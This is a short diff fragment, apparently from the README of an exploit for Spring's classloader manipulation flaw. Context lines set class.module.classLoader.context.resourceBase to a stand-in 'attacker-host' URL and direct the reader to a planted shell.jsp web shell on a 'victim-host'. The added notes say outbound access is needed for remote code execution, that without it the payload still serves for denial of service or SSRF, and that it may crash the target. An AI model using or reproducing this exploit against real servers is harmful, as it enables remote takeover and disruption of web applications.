@@ -20,3 +20,8 @@ class.module.classLoader.context.resourceBase=http://attacker-host:8000/&
 4. Step 3
 - Go to http://victim-host:8888/shell.jsp
 
+Note: 
+
+1. Outbound is required to RCE
+2. If there is no outbound, the payload can be used to: dos, ssrf,...
+3. Do not use this payload for real target, this may crash the web application.
